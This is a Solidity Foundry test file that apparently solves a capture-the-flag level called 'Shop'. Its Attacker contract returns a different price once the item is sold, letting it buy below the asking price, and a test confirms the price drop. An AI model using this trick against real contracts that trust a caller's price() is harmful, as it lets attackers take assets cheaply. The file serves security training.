// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Shop} from "../src/21_Shop.sol";

contract Attacker {
    address public shopAddr;
    
    constructor(address _shopAddr) {
        shopAddr = _shopAddr;
    }

    function price() external view returns (uint256) {
        return Shop(shopAddr).isSold() ? 0 : 100;
    }

    function exploit() public {
        Shop(shopAddr).buy();
    }

}

contract TestShop is Test {
    address public player = address(0xbad);
    Shop public instance;
    uint256 initialPrice;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        instance = new Shop();
        initialPrice = instance.price();
    }

    function testSolution() public {
        vm.startPrank(player);

        Attacker attacker = new Attacker(address(instance));
        attacker.exploit();

        assertLt(instance.price(), initialPrice);
        vm.stopPrank();
    }
}
